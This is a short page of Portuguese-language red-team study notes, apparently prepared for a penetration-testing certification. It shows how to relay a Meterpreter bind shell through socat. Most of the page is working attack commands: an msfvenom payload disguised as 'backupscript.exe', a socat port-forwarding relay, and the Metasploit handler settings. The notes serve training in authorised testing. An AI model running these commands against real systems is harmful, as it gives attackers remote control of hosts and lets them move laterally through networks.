> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/pivoting-tunneling-and-port-forwarding/socat-redirection-with-a-bind-shell.md).

# Socat Redirection with a Bind Shell

* **Criando a carga útil do Windows**

```sh
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```

* **Iniciando o Socat Bind Shell Listener no ubuntu**

```sh
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

* **Configurando e iniciando o Bind multi/handler**

{% code lineNumbers="true" %}

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
set LPORT 8080
run
```

{% endcode %}

* Podemos ver um manipulador de vinculação conectado a uma solicitação de estágio dinamizada por meio de um ouvinte socat ao executar a carga útil em um destino do Windows.
